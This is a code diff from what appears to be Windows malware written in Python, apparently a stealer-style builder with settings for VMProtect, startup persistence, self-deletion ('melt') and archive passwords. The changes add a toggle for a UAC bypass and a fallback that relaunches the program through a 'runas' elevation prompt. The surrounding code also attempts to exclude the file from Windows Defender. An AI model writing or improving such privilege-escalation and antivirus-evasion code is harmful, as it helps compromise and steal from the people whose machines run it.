@@ -28,6 +28,7 @@ class Settings:
     Vmprotect = bool("%vmprotect%")
     Startup = bool("%startup%")
     Melt = bool("%melt%")
+    UacBypass = bool("%uacBypass%")
     ArchivePassword = "%archivepassword%"
     HideConsole = bool("%hideconsole%")
     Debug = bool("%debug%")
@@ -307,7 +308,7 @@ class Utility:
     
     @staticmethod
     def IsAdmin() -> bool: # Checks if the program has administrator permissions or not
-        return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
+        return ctypes.windll.shell32.IsUserAnAdmin() == 1
     
     @staticmethod
     def UACbypass(method: int = 1) -> None: # Tries to bypass UAC prompt and get administrator permissions (exe mode)
@@ -1589,11 +1590,14 @@ if __name__ == "__main__" and os.name == "nt":
     if not Utility.IsAdmin(): # No administrator permissions
         Logger.warning("Admin privileges not available")
         if Utility.GetSelf()[1]:
-            if not "--nouacbypass" in sys.argv:
+            if not "--nouacbypass" in sys.argv and Settings.UacBypass:
                 Logger.info("Trying to bypass UAC (Application will restart)")
                 Utility.UACbypass() # Tries to bypass UAC Prompt (only for exe mode)
-            else:
-                Logger.error("Failed to bypass UAC")
+            
+            if not Utility.IsInStartup() and not Settings.UacBypass:
+                Logger.info("Showing UAC prompt to user (Application will restart)")
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+                os._exit(0)
     
     if Utility.GetSelf()[1]: 
         Logger.info("Trying to exclude the file from Windows defender")
